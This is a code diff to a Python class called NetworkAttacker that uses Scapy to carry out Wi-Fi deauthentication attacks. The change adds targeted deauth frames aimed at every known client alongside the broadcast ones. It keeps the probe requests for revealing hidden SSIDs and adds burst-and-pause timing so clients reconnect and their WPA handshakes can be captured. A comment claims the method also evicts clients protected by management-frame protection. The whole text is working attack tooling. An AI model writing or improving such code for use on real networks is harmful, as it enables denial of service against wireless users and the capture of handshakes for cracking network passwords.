@@ -100,18 +100,35 @@ class NetworkAttacker(BaseAttacker):
             pkt_probe = (RadioTap() / Dot11(addr1=self.target_bssid,
                          addr2=self._get_interface_mac(),
                          addr3=self.target_bssid) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info=""))
+            burst_counter = 0
             while not self.stop_attack:
                 if self.success and self.attack_mode == "reveal":
                     break
                 if self.handshake_captured and self.attack_mode == "handshake":
                     break
                 try:
-                    self._send_deauth_broadcast(count=10)
+                    # 1. Send broadcast deauth + CSA beacon (evicts standard & PMF clients)
+                    self._send_deauth_broadcast(count=6)
+
+                    # 2. Targeted deauth to every known active client
+                    current_clients = list(self.clients)
+                    for client_info in current_clients:
+                        client_mac = client_info[0] if isinstance(client_info, tuple) else client_info
+                        self._send_deauth_to_client(client_mac, count=4)
+
                     if self.attack_mode not in ["handshake", "deauth_only"]:
                         sendp(pkt_probe, iface=self.interface, count=1, verbose=False)
+
+                    burst_counter += 1
+                    # In handshake capture: burst for 6 cycles (~6s) then pause 3s to let client reconnect & finish handshake
+                    if self.attack_mode == "handshake" and burst_counter % 6 == 0:
+                        time.sleep(3)
+                    else:
+                        time.sleep(1)
+
                 except Exception as e:
                     logger.debug(f"Attack Loop Error: {e}")
-                time.sleep(1)
+                    time.sleep(1)
         except Exception as e:
             logger.error(f"Attack Thread Crash: {e}")
 
